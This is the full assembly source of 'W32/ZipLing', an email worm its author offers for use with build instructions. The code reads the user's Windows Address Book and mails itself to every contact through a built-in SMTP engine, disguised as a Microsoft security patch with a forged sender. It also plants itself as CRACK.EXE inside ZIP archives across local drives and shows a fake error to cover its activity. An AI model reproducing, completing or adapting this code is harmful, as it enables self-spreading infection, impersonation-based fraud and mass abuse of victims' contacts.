;
; W32/ZipLing -
;
;	First of all this is the source code to an I-Worm. I do not guarantee it works, although
; I have tested it on my system and it had seemed to work. I lost interest in it after a while
; so I completely forgot about it until one day, when i decided to finish my I-Worm ;). It should
; work however, because as far as my short-term memory goes back it seemed to work OK where it
; was at a couple of weeks ago. Basically now I just added in the threads and took out the breakpoints,
; so I think it should travel nicely (if it was spreaded). Anyway, please contact me if you find
; a problem or if you'd like to comment on it. I am not responsible for what happens to you or
; other people if you use it. You've been warned =) 
;
;
;	This is my I-Worm. I been workin on it for about 4 weeks (i took a bit of a break for 1
; week:).  It doesn't travel by MAPI but it does somewhat rely on Outlook.  It needs Windows
; Address Book, but this shouldn't be a problem because most people have outlook.  It uses its
; own SMTP engine.  It Mime encodes the worm EXE and sends it out to all addresses in the default
; WAB file.  As you can see, this can spread very well if it gets sent to the right place.  This
; worm uses many anti-debug and anti-emu tricks, to make detection of it harder.  It creates 2 threads:
; 1 checks 1 drive for zip files, dropping a crack.exe over all of them.
; User may think it is a bit suspicious but I'm sure he doesnt look at all of his zip files.  Other thread
; finds email addresses and sends each a copy of the worm+msg from microsoft :). Worm is named patch.exe
; and claims to fix a serious bug inside windows core (kernel32) files. It doesn't though; it just gives
; a message saying corrupt CRC or something the like.  The file that it drops inside zip files says same
; thing, and since they are crack.exe and patch.exe it should fit both.
;
;
;       This source is does not have many comments. If you want to learn how to create a worm,
; I recommend you try the MAPI way first. There are a couple of ASM worms that are straight
; forward for you to learn on.
;
;
;
;	How to build:
;	(masm32)
;	ml /c /coff ziplung.asm
;	link /SUBSYSTEM:WINDOWS ziplung.obj
;	pewrsec ziplung.exe
;	ziplung.exe
;	^^^^^^^^^^^-> hehehe
;
;	please pay visit to http://bluebola.8k.com !
;
;	and.. Enjoy. 

.486p
.model flat,stdcall
option casemap :none
include \masm32\include\windows.inc
include \masm32\include\zipfile.inc
include \masm32\include\advapi32.inc
include \masm32\include\kernel32.inc
include \masm32\include\wsock32.inc
include \masm32\include\user32.inc
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\wsock32.lib
includelib \masm32\lib\advapi32.lib
includelib \masm32\lib\user32.lib

	SearchZIP PROTO :DWORD
	thread1 PROTO
	thread2 PROTO

.code		; CODE SECTION of worm
start:
	jmp @F

	filename db 128 dup (?)
	szTemp db "tmp9174.tmp",0
	mem01 dd 0
	hTemp dd 0
	tSize dd 0
	thid1 dd 0
	thid2 dd 0
fr db 260 dup (?)
msg db "Could not patch due to bad CRC!",0
@@:	
	invoke GetModuleFileName,0,addr filename,128
	invoke CopyFile,addr filename,addr szTemp,0
	invoke CreateFile,addr szTemp,0c0000000h,01h,00h,03h,00h,00h
	mov hTemp,eax
	invoke GetFileSize,EAX,0
	mov ebx,eax
	invoke GlobalAlloc,0,eax
	mov mem01,eax
	invoke ReadFile,hTemp,mem01,ebx,addr filename,00h
	invoke CloseHandle,hTemp
	; MEM01 now = ptr to our EXE. We need this for MIME and ZIP appending
	mov tSize,EBX	
	mov zpC_S1,EBX		; adjust the size of our data
	mov zpC_S2,EBX
	mov zpL_S1,EBX
	mov zpL_S2,EBX

	invoke MessageBox,0,addr msg,0,0

	invoke CreateThread,0,0,addr thread1,addr fr,0,addr thid1
	mov ebx,eax
	
	invoke CreateThread,0,0,addr thread2,0,0,addr thid2
	mov esi,eax
	
	invoke WaitForSingleObject,ebx,-1
	invoke WaitForSingleObject,esi,-1
	jmp LeaveNow
	
Recipient db 256 dup (?)
sizeRecip dd $-Recipient	
	
sendtable:
	dd offset SendHelo		; HELO LocalHost
	dd offset SendFrom		; MAIL FROM:
	dd offset SendRcpt		; RCPT TO:
	dd offset SendData1		; send the DATA part of the message
	dd offset SendData2		; sends the actual DATA
	dd offset SendQuit		; send the QUIT part	
	dd 00000000h			; end marka
buffer db 512 dup (?)	
; Used for SELECT calls
Timeout:
	dd 5
	dd 0
FDSet:
           dd 1
MailSocket dd 0
SendWorm:	; This little part of the worm does this here:
		; Gets Default Email server
		; Connects to it
		; Sends the message
	pushad
openkey:
	xor eax,eax
	call @F
	phkMailKey dd 0
	@@:
	push KEY_ALL_ACCESS
	push eax
	call @F
			db "Software\Microsoft\Internet Account Manager"
slashkey		db 0
			db "Accounts\"
lpDefaultAccount	db 8 dup(0)
			db 0
	@@:
	push HKEY_CURRENT_USER
	call RegOpenKeyEx
	
	or eax,eax
	jnz LeaveNow
	
	cmp byte ptr [slashkey],0
	jnz getsmtpmail
	
	xor eax,eax
	call @F
	dd 00000009h
	@@:
	push offset lpDefaultAccount
	push eax
	push eax
	call @F
	db "Default Mail Account",0
	@@:
	push dword ptr [phkMailKey]
	call RegQueryValueEx
	push dword ptr [phkMailKey]
	call RegCloseKey
	mov byte ptr [slashkey],'\'	
	jmp openkey
getsmtpmail:
	xor eax,eax
	call @F
	dd 00000200h	; 512 bytes
	@@:
	push offset buffer
	push eax
	push eax
	call @F
	db "SMTP Server",0
	@@:
	push dword ptr [phkMailKey]
	call RegQueryValueEx
	push dword ptr [phkMailKey]
	call RegCloseKey
	
	lea edi,buffer
;Чееееееееееееееееееееееееееееееееееееееееее
	call @F
	pp2 WSADATA <?>
	@@:
	push 0101h
	call WSAStartup
;Чееееееееееееееееееееееееееееееееееееееееее
	push edi
	call gethostbyname
	
	mov eax,[eax+12]
	mov eax,[eax]
	mov eax,[eax]		; we got the DWORD IP
	
	mov dword ptr [dwIPAddress],EAX

	push 0
	push 1
	push 2
	call socket
	mov MailSocket,EAX
	inc eax
	jz LeaveNow

	push 16		; size of following structure
	call @F
	dw AF_INET
hPort   db 0, 25
dwIPAddress dd 0
Reserved2 dd 0,0
	@@:
	push dword ptr [MailSocket]
	call connect
	inc eax
	jz EndWinsock
;Чееееееееееееееееееееееееееееееееееееееееее
	cld
	lea ebx,sendtable	; sendtable = table of functions that operate w/ smtp server
WaitForResponse:		; check if its ok to read
	xor eax,eax
	push offset Timeout
	push eax
	push eax
	push offset FDSet
	push eax
	call select
	
	dec eax
	jnz EndWinsock
	
	call @worm_recv		; receive the data into ptr supplied by ESI
	or eax,eax
	jz EndWinsock

	lodsb
	dec esi		; we dont want to modify ESI
okiebyte equ $+1	; to change the 032h	
	cmp al,032h	; 032h = "2" = OK :)
	jnz EndWinsock	; no no its not ok
	
	mov byte ptr [okiebyte],032h	; fixor it when we mess it up
SendOurResponse:		; check if its okay to write
	xor eax,eax
	push offset Timeout
	push eax
	push offset FDSet
	push eax
	push eax
	call select	
	
	dec eax
	jnz EndWinsock

	call dword ptr [ebx]
	or eax,eax
	jz EndWinsock		; zero = error
	
	cmp dword ptr [ebx+4],0
	jz EndWinsock		; end of table
	
	add ebx,4
	jmp WaitForResponse
SendHelo:		; sends a HELO command
	jmp @F
	pHelo db "HELO LocalHost",0Dh,0Ah
        sHelo equ $-pHelo
@@:
	lea esi,pHelo
	mov ecx,sHelo
	call @worm_send			; send the data
	ret
SendQuit:		; sends a QUIT command
	jmp @F
	pQuit db "QUIT",0Dh,0Ah
	sQuit equ $-pQuit
@@:
	lea esi,pQuit
	mov ecx,sQuit
	call @worm_send			; send the data
	ret
SendFrom:
	jmp @F
	pFrom db "MAIL FROM:<critical@microsoft.com>",0Dh,0Ah
	sFrom equ $-pFrom
@@:
	lea esi,pFrom
	mov ecx,sFrom
	call @worm_send
	ret
SendRcpt:
	jmp @F
	pRcpt db "RCPT TO:<"
	sRcpt equ $-pRcpt
	pRcpt2 db ">",0Dh,0Ah
	sRcpt2 equ $-pRcpt2
@@:
	lea esi,pRcpt
	mov ecx,sRcpt
	call @worm_send
	
	lea esi,Recipient	; who to email it to
	mov ecx,sizeRecip	; Size of the string
	call @worm_send
	
	lea esi,pRcpt2
	mov ecx,sRcpt2
	call @worm_send		; send the 0A0Dh so server accepts it
	ret
SendData1:
	jmp @F
	pData db "DATA",0Dh,0Ah
	sData equ $-pData
@@:
	lea esi,pData
	mov ecx,sData
	call @worm_send
	mov byte ptr [okiebyte],033h
	ret
SendData2:
	jmp @F
	pData2 db "From: Microsoft Critical Response Team <critical@microsoft.com>",0Dh,0Ah
	       db "Subject: Urgent message for all Windows users",0Dh,0Ah
	       db "MIME-Version: 1.0",0Dh,0Ah
	       db 'Content-Type: multipart/mixed; boundary="bound"',0Dh,0Ah
	       db 0Dh,0Ah
	       db '--bound',0Dh,0Ah
	       db 'Content-Type: text/plain; charset=ISO-8859-1',0Dh,0Ah
	       db 'Content-Transfer-Encoding: 7bit',0Dh,0Ah
	       db 0Dh,0Ah
	       db "Dear Windows User,",0Dh,0Ah
	       db 0Dh,0AH
	       db "   The Microsoft Security Experts have discovered a bug inside the Windows'",0Dh,0Ah
	       db " files that poses a security threat to all versions of Windows newer than  ",0Dh,0Ah
	       db " Windows98 (including Windows98). Virus experts have reported that few known",0Dh,0Ah
	       db " viruses have been identified using this exploit, but more are expected. A ",0Dh,0Ah
	       db " patch has been supplied with this email and will fix the security hole.   ",0Dh,0Ah
	       db 0Dh,0Ah
	       db "    **THIS MESSAGE WAS DELIVERED VIA MICROSOFT ALERT AUTO-MESSENGER** ",0Dh,0Ah
	       db '--bound',0Dh,0Ah
	       db 'Content-Type: application/octet-stream; name=patch.exe',0Dh,0Ah
	       db 'Content-Transfer-Encoding: base64',0Dh,0Ah
	       db 0Dh,0Ah
	       
	sData2 equ $-pData2
	pDot   db 0Dh,0Ah,'--bound--',0Dh,0Ah
	       db 0Dh,0Ah
	       db "."
	       db 0Dh,0Ah
	sDot equ $-pDot
	
	mem02 dd 0
	
@@:

	lea esi,pData2
	mov ecx,sData2
	call @worm_send
	; Send the actual file in mime format
	invoke GlobalAlloc,0,7168*3	; for mime encoded
	mov mem02,eax
	
	mov eax,tSize		; Data size MUST BE DIVISIBLE BY 3!
	mov ecx,3
	xor edx,edx
	div ecx
	inc eax
	xor edx,edx
	mul ecx
	mov ecx,eax

	mov edx,mem02		
	mov eax,mem01
	call encodebase64

	mov esi,mem02
	call @worm_send
	
	lea esi,pDot
	mov ecx,sDot
	call @worm_send
	
	invoke GlobalFree,mem02

	ret
	
;Чееееееееееееееееееееееееееееееееееееееееее
EndWinsock:
	push dword ptr [MailSocket]
	call closesocket

	popad
	ret
	
;Чееееееееееееееееееееееееееееееееееееееееее
LeaveNow:
	invoke ExitProcess,0

@worm_recv:
	lea esi,buffer
	push 0
	push 512
	push esi
	push dword ptr [MailSocket]
	call recv
	ret

@worm_send:
	; ESI = ptr to what to send
	; ECX = size of data to send
	push 0
	push ecx
	push esi
	push dword ptr [MailSocket]
	call send
	ret

;Чееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееее
; ZIP Appending procedures (c) blueEbola 2001-2002
; Feel free to distibute this procedure or use it in your own code.
;
zipappend:
	jmp @F
zpLocalFile dd 04034B50h	; PK signature
	    dw 0014h
	    dw 8000h
	    dw 0000h
	    dw 8C78h
	    dw 8578h
zpL_crc     dd 00000000h
zpL_S1	    dd sizeLoc-data_s
zpL_S2	    dd sizeLoc-data_s
	    dw 0009h		; filename = 8 chars long
	    dw 0000h
	    db "CRACK.EXE"	; Most users run cracks hehe (we give a fake message :)
data_s:
sizeLoc equ $

fName dd 0	; pointer to name to infect
hFile dd 0
fSize dd 0
hAlloc dd 0
dwTempRW dd 0

zpCentralDir dd 02014b50h
	     db 14h
	     db 00h
	     db 14h
	     db 00h
	     dw 8000h
	     dw 0000h
	     dw 8c78h
	     dw 8578h
zpC_crc	     dd 00000000h
zpC_S1	     dd sizeLoc-data_s
zpC_S2	     dd sizeLoc-data_s
	     dw 0009h
	     dw 0,0,0,0
	     dd 00000020h
rvaloc	     dd 00000000h
	     db "CRACK.EXE"
sizeCen equ $
@@:
	    mov fName,ESI

	    mov ecx,zpL_S1
	    mov esi,mem01
	    call CRC32
	    mov zpC_crc,EAX
	    mov zpL_crc,EAX

	    invoke CreateFile,fName,0c0000000h,01h,00h,03h,00h,00h
	    mov hFile,EAX
	    inc eax
	    jz errorzip
	    dec eax
	    invoke GetFileSize,hFile,0
	    mov fSize,EAX
	    invoke GlobalAlloc,0,fSize
	    mov hAlloc,EAX
	    invoke ReadFile,hFile,eax,fSize,addr dwTempRW,0   
	    invoke CloseHandle,hFile
;Чееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееее
; Appends to data to zip files. (c) blueEbola (me'za love copyrights:)
; Most of this was taken from my zippy_ok.asm file and my article, greetz to me :)

	    mov edi,hAlloc
	    add edi,fSize
	    sub edi,4
LocateEndOfCentral:	
	    cmp dword ptr [edi],06054B50h	; PK signature for endofcentral
	    jz FoundEndOfCentral
	    dec edi
	    jmp LocateEndOfCentral
FoundEndOfCentral:
	    ; OK, we have to check if it is infected
	    jmp checkzip
Infect:
	    ASSUME EDI:PTR ZIPEndOfCentralDir
	    mov esi,[edi].ZECD_RVACentralDir

	    invoke CreateFile,fName,0C0000000h,01h,00h,02h,00h,00h
	    mov hFile,EAX
	    mov ebx,hAlloc
	    invoke WriteFile,hFile,ebx,esi,addr dwTempRW,0
	    add ebx,esi
	    invoke WriteFile,hFile,addr zpLocalFile,sizeLoc-zpLocalFile,addr dwTempRW,0
	    invoke WriteFile,hFile,mem01,tSize,addr dwTempRW,0
	    mov ecx,[edi].ZECD_SizeOfCentralDir
	    invoke WriteFile,hFile,ebx,ecx,addr dwTempRW,0
	    mov rvaloc,esi
	    invoke WriteFile,hFile,addr zpCentralDir,sizeCen-zpCentralDir,addr dwTempRW,0
	    mov ebx,rvaloc

	    add ebx,sizeLoc-zpLocalFile	; size of file
	    add ebx,zpL_S1
	    mov ecx,[edi].ZECD_SizeOfCentralDir
	    add ecx,sizeCen-zpCentralDir
	    mov [edi].ZECD_SizeOfCentralDir,ECX
	    inc [edi].ZECD_TotalNumberOfEntries
	    inc [edi].ZECD_NumberOfEntries
	    mov [edi].ZECD_RVACentralDir,EBX
	    
	    mov ebx,hAlloc
	    add ebx,fSize
	    sub ebx,edi
	    invoke WriteFile,hFile,edi,ebx,addr dwTempRW,0
	    invoke CloseHandle,hFile
	    
errorzip:	    
	    invoke GlobalFree,hAlloc	; free the mem
	    ret
	    
checkzip:
	    pushad
search:	    cmp dword ptr [edi],02014B50h
	    jz foundlast
	    dec edi
	    jmp search
foundlast:  lea edi,[edi+2Eh]	; Filename
	    cmp dword ptr [edi],'CARC'	; CRAC*.***
	    popad
	    jz errorzip	; abort
	    jmp Infect	    
	    
CRC32 proc	; ecx = size string esi = string
	push esi ; I found this proc inside T2000's article on encrypting ZIP files
	push edx ; thanx T2000 you're a life saver (i been looking everywhere for good CRC32
	         ; function because WinZip didn't like my old one!) :) greetz to you!
	stc
	sbb edx,edx
	clc
	cld
LoadChar:
	lodsb
	xor dl,al
	mov al,08h	; 8 bits
BitCRC:
	shr edx,1	; get bit into carry flag
	jnc NoCRC	; not set, no CRC
	xor edx,0EDB88320h ; crc found
NoCRC:  dec al		; next bit
	jnz BitCRC
	loop LoadChar
	
	xchg edx,eax
	not eax
	
	pop edx
	pop esi
	ret
CRC32 endp
;Чееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееее
; ZIP search procedure
;
; Recursive ZIP file find function
; Infects every 3rd zip file found on the system
; BTW, In MASM32 v7.0, the FindFile example was created by me :)
; 
; Requirements: s_path buffer must not contain '\' at the end of it (ie. 'C:\Windows')
;

SearchZIP PROC s_path:DWORD		; ptr at s_path must be 260 bytes long (will crash otherwise!:)

	LOCAL wTemp[260]:BYTE		; temporary
	LOCAL wfd:WIN32_FIND_DATA
	LOCAL hFind:DWORD
	
	invoke Sleep,300d	; wait a 0.3 seconds
	
	jmp zerodir		; zero out the string above
__ret001:
	lea edi,wTemp

	push edi
	mov esi,s_path
	mov ecx,260
	rep movsb
	pop edi

	xor al,al
	scasb
	jnz $-1			; get to the 0byte
	
	dec edi
	
	mov ax,'*\'
	stosw
	
	invoke FindFirstFile,addr wTemp,addr wfd
	mov hFind,EAX
	push eax
	inc eax
	jz NoFiles
	pop ebx
	
	; API's dont modify EBX- its good for handles
	.while EBX > 0
	  lea esi,wfd.cFileName	; filename
	  lodsw
	  .if AX != 2E2Eh && AX != 002Eh	; '..' or '.'
	    ; its not those silly directories...
	    sub esi,02Eh
	    mov eax,[esi]
	    .if AL & 010h		; is it a directory
	        ; It is a directory
	        lea esi,wfd.cFileName
	        lea edi,wTemp
	        
	        mov al,'*'
	        scasb
	        jnz $-1
	        sub edi,2
	        
	        push edi
	        
	        xor ecx,ecx
	        mov al,'\'
	        
boohoo:         stosb
	        lodsb
	        inc ecx
	        cmp al,00h
	        jnz boohoo 
	        
	        pop edi
	        pushad
	        invoke SearchZIP,addr wTemp
	        popad
	        
	        mov ax,'*\'
	        stosw
	        
	        sub ecx,2
	        xor al,al
	        rep stosb
	        
	    .else
	    	; It is a file
	    	; Now we have to check if it is a .ZIP file
	    	lea edi,wfd.cFileName
	    	xor al,al
	  	xor ecx,ecx
	  	not ecx
	  	repnz scasb
	  	
	  	sub edi,5
	  	mov eax,dword ptr [edi]
	  	or eax,020202020h
	  	cmp eax,'piz.'		; .zip file?
	  	jnz __ret002

	  	lea edi,wTemp
	  	mov al,'*'
	  	xor ecx,ecx
	  	not ecx
	  	repnz scasb
	  	sub edi,2
	  	
	  	xor eax,eax
	  	stosw
	  			
		invoke SetCurrentDirectory,addr wTemp
		lea esi,wfd.cFileName
		
		pushad
		call zipappend
		popad

	  	lea edi,wTemp
	  	xor al,al
	  	xor ecx,ecx
	  	not ecx
		repnz scasb
		sub edi,2

		mov ax,'*\'
		stosw

	    .endif
	    
	  .endif  
	  jmp zerowfd
__ret002:
	  invoke FindNextFile,hFind,addr wfd
	  mov ebx,eax
	.endw

	invoke FindClose,hFind
NoFiles:
	ret
;###########################	
zerodir:
	xor al,al
	lea edi,wTemp
	mov ecx,260
	rep stosb
	jmp __ret001
zerowfd:
	xor al,al
	lea edi,wfd.cFileName
	mov ecx,256
	rep stosb
	jmp __ret002
	  
SearchZIP ENDP	  
;Чееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееее
; EncodeBase64: Encodes data into MIME format
encodebase64:   ; encodeBase64: Proper credit goez out to BumbleBee. I struggled with making
		; my own MIME encoder so I ripped one.. :) Thanks alot Bumblebee!!
; input:
;       EAX = Address of data to encode
;       EDX = Address to put encoded data
;       ECX = Size of data to encode
; output:
;       ECX = size of encoded data
;
        xor     esi,esi 
        call    over_enc_table
        db      "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        db      "abcdefghijklmnopqrstuvwxyz"
        db      "0123456789+/"
over_enc_table:
        pop     edi
        push    ebp
        xor     ebp,ebp
baseLoop:
        movzx   ebx,byte ptr [eax]
        shr     bl,2
        and     bl,00111111b
        mov     bh,byte ptr [edi+ebx]
        mov     byte ptr [edx+esi],bh
        inc     esi

        mov     bx,word ptr [eax]
        xchg    bl,bh
        shr     bx,4
        mov     bh,0
        and     bl,00111111b
        mov     bh,byte ptr [edi+ebx]
        mov     byte ptr [edx+esi],bh
        inc     esi

        inc     eax
        mov     bx,word ptr [eax]
        xchg    bl,bh
        shr     bx,6
        xor     bh,bh
        and     bl,00111111b
        mov     bh,byte ptr [edi+ebx]
        mov     byte ptr [edx+esi],bh
        inc     esi

        inc     eax
        xor     ebx,ebx
        movzx   ebx,byte ptr [eax]
        and     bl,00111111b
        mov     bh,byte ptr [edi+ebx]
        mov     byte ptr [edx+esi],bh
        inc     esi
        inc     eax

        inc     ebp
        cmp     ebp,24
        jna     DontAddEndOfLine

        xor     ebp,ebp                         ; add a new line
        mov     word ptr [edx+esi],0A0Dh
        inc     esi
        inc     esi
        test    al,00h                          ; Optimized (overlap rlz!)
        org     $-1
DontAddEndOfLine:
        inc     ebp
        sub     ecx,3
        or      ecx,ecx
        jne     baseLoop

        mov     ecx,esi
        add     edx,esi
        pop     ebp
        ret
;Чееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееее
; Locates addresses inside the default WAB file
WABFindAddies PROC
	jmp @F
	mappedFile dd 0
	mapHandle dd 0
	fileHandle dd 0
	addrbuf db 256 dup (?)
@@:
	
	xor eax,eax
	call @F
	phkWABKey dd 0
	@@:
	push KEY_ALL_ACCESS
	push eax
	call @F
	db "Software\Microsoft\WAB\WAB4\Wab File Name",0
	@@:
	push HKEY_CURRENT_USER
	call RegOpenKeyEx
	
	xor eax,eax
	call @F
	dd 0000007Fh
	@@:
	push offset wabfile
	push eax
	push eax
	push eax		; null for (default)
	push dword ptr [phkWABKey]
	call RegQueryValueEx
	push dword ptr [phkWABKey]
	call RegCloseKey

	push 0
	push 0
	push 3
	push 0
	push 1
	push 80000000h
	call @F
wabfile	db 128 dup (?)
@@:
	call CreateFile

	mov fileHandle,eax
	xchg eax,ebx

	or ebx,ebx
	jz leavewab
	
	push 0
	push ebx
	call GetFileSize
	mov esi,eax
	
	push 0
	push esi
	push 0
	push PAGE_READONLY
	push 0
	push ebx
	call CreateFileMapping
	mov mapHandle,eax
	xchg eax,ebx
	
	or ebx,ebx
	jz leavewab
	
	push esi
	push 0
	push 0
	push FILE_MAP_READ
	push ebx
	call MapViewOfFile
	mov mappedFile,eax
	xchg eax,ebx
	
	or ebx,ebx
	jz leavewab
;Чееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееее
; Find the addresses
	; EBX=Base address
	mov esi,ebx
	mov ecx,[esi+64h]	; number of addies	
	add esi,[esi+60h]	; points to first address
looperz:
	push esi
	lea edi,Recipient
	push edi
lop:
	lodsw
	stosb
	or al,al
	jnz lop
	pop ebx
	
	sub edi,ebx
	mov sizeRecip,EDI
	
	pop esi
	add esi,044h
	
	PUSHAD
	CALL SendWorm		; send the worm out!
	POPAD
	
	push ecx
	lea edi,Recipient
	xor al,al
	mov ecx,256
	rep stosb
	pop ecx		
	
	dec ecx
	jecxz leavewab
	jmp looperz

;Чееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееее
leavewab:
	invoke UnmapViewOfFile,mappedFile
	invoke CloseHandle,mapHandle
	invoke CloseHandle,fileHandle
	
	ret
WABFindAddies ENDP
;Чееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееееее
; Thread procedures
thread1 proc	
	mov al,'c'
	lea edi,fr
	stosb
	mov ax,'\:'
	stosw
	sub edi,3
isdriveok:
	push edi
	call GetDriveType
	cmp al,03h
	jnz nextdrive
	
	mov byte ptr [edi+2],00h
	
	jmp SearchZIP		; we dont even need a ret!

nextdrive:
	cmp al,"z"
	jz enddrive
	inc byte ptr [edi]
	jmp isdriveok
enddrive:
	ret
thread1 endp

thread2 proc
	pop eax		; dont need param
	mov [esp],eax
	call WABFindAddies
	xor eax,eax
	ret
thread2 endp
end start